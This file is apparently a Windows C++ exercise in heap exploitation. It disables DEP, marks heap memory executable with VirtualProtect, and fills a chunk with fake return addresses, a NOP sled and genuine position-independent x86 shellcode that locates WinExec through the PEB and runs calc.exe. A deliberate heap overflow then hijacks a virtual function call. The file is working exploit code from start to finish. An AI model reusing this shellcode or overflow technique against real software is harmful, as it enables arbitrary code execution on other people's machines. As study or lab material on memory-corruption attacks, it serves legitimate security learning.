#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <Winbase.h>
#include <memoryapi.h>

using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
	void function1(){
	};
 
	virtual void virtualFunction(){
		printf("test\n");
	};
};

int main(int args, char ** argv){
	SetProcessDEPPolicy(0x00000002);
	int i;
	HANDLE hChunk;
	void * allocations[ALLOC_COUNT];
	SomeObject * objects[5];
	SomeObject * obj = new SomeObject();
	printf("SomeObject address : 0x%08p\n", obj);
	int vectorSize = 40;

	HANDLE defaultHeap = GetProcessHeap();

	for(i = 0; i < ALLOC_COUNT; i++){
	hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
	memset(hChunk, 'A', 0x190);

	allocations[i] = hChunk;

	printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
	}
	DWORD protectlength = 0x00000040;
	PDWORD heapstart = (DWORD *) allocations[0];
	PDWORD heapend = (DWORD *) allocations[2] + protectlength;
	VirtualProtect(heapstart, 0x1000, 0x40, heapend);
	HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);

	vector<SomeObject*> v1(vectorSize, obj);
	vector<SomeObject*> v2(vectorSize, obj);
	vector<SomeObject*> v3(vectorSize, obj);
	vector<SomeObject*> v4(vectorSize, obj);
	vector<SomeObject*> v5(vectorSize, obj);
	vector<SomeObject*> v6(vectorSize, obj);
	vector<SomeObject*> v7(vectorSize, obj);
	vector<SomeObject*> v8(vectorSize, obj);
	vector<SomeObject*> v9(vectorSize, obj); 
	vector<SomeObject*> v10(vectorSize, obj);

	printf("vector : 0x%08p\n", (void*) &v1);
	printf("vector : 0x%08p\n", (void*) &v2);
	printf("vector : 0x%08p\n", (void*) &v3);
	printf("vector : 0x%08p\n", (void*) &v4);
	printf("vector : 0x%08p\n", (void*) &v5);
	printf("vector : 0x%08p\n", (void*) &v6);
	printf("vector : 0x%08p\n", (void*) &v7);
	printf("vector : 0x%08p\n", (void*) &v8);
	printf("vector : 0x%08p\n", (void*) &v9);
	printf("vector : 0x%08p\n", (void*) &v10);
	memset(allocations[2], 'A', 0x190);
	char * heapret = (char *) allocations[2];
	char heapret_chararray[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray = (uint32_t) heapret;
	char return_address_1[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char return_address_2[] = "\xCC\xCC\xCC\xCC";
	char return_address_3[] = "\xDD\xDD\xDD\xDD";
	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char * heapret_2 = (char *) allocations[2] + 4;
	char heapret_chararray_2[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_2 = (uint32_t) heapret_2;
	char * heapret_3 = (char *) allocations[2] + 8;
	char heapret_chararray_3[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_3 = (uint32_t) heapret_3;
	char * heapret_4 = (char *) allocations[2] + 16;
	char heapret_chararray_4[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_4 = (uint32_t) heapret_4;
	char * ret_1 = heapret_chararray;
	char * ret_2 = heapret_chararray_2;
	char * ret_3 = heapret_chararray_3;
	char * ret_4 = heapret_chararray_4;

	char shellcode_1[14] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char shellcode_2[14] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char shellcode_3[14] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char shellcode_4[14] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char shellcode_5[17] = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b";
	char shellcode_6[17] = "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3";
	char shellcode_7[17] = "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24";
	char shellcode_8[17] = "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14";
	char shellcode_9[17] = "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18";
	char shellcode_10[17] = "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74";
	char shellcode_11[17] = "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41";
	char shellcode_12[17] = "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52";
	char shellcode_13[17] = "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51";
	char shellcode_14[17] = "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff";
	char shellcode_15[17] = "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f";
	char shellcode_16[17] = "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2";
	char shellcode_17[4] = "\x52\xff\xd0";
	// EAX OFFSET = 24
	// EDX offset = 28
	memmove((char *) allocations[2], ret_2, 0x4);
	memmove((char *) allocations[2] + 4, ret_3, 0x4);
	memmove((char *) allocations[2] + 8, ret_4, 0x4);
	memmove((char *) allocations[2] + 16, shellcode_1, 0xC);
	memmove((char *) allocations[2] + 29, shellcode_2, 0xC);
	memmove((char *) allocations[2] + 42, shellcode_3, 0xC);
	memmove((char *) allocations[2] + 55, shellcode_4, 0xC);
	memmove((char *) allocations[2] + 68, shellcode_5, 0x10);
	memmove((char *) allocations[2] + 84, shellcode_6, 0x10);
	memmove((char *) allocations[2] + 100, shellcode_7, 0x10);
	memmove((char *) allocations[2] + 116, shellcode_8, 0x10);
	memmove((char *) allocations[2] + 132, shellcode_9, 0x10);
	memmove((char *) allocations[2] + 148, shellcode_10, 0x10);
	memmove((char *) allocations[2] + 164, shellcode_11, 0x10);
	memmove((char *) allocations[2] + 180, shellcode_12, 0x10);
	memmove((char *) allocations[2] + 196, shellcode_13, 0x10);
	memmove((char *) allocations[2] + 212, shellcode_14, 0x10);
	memmove((char *) allocations[2] + 228, shellcode_15, 0x10);
	memmove((char *) allocations[2] + 244, shellcode_16, 0x10);
	memmove((char *) allocations[2] + 260, shellcode_17, 0x3);

	memset((char *) allocations[2] + 265, '\xCC', 0x87);
	memmove((char *) allocations[2] + 400, return_address_1, 0x18);
	//memmove((char *) allocations[2] + 424, payload, 0x18);
	memmove((char *) allocations[2] + 424, (char *) allocations[2], 0x4);
	memmove((char *) allocations[2] + 428, (char *) allocations[2], 0x4);
	memset((char *) allocations[2] + 432, 'A', 0x1000);
	//memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
	v1.at(0)->virtualFunction();
	system("PAUSE");

	return 0;
}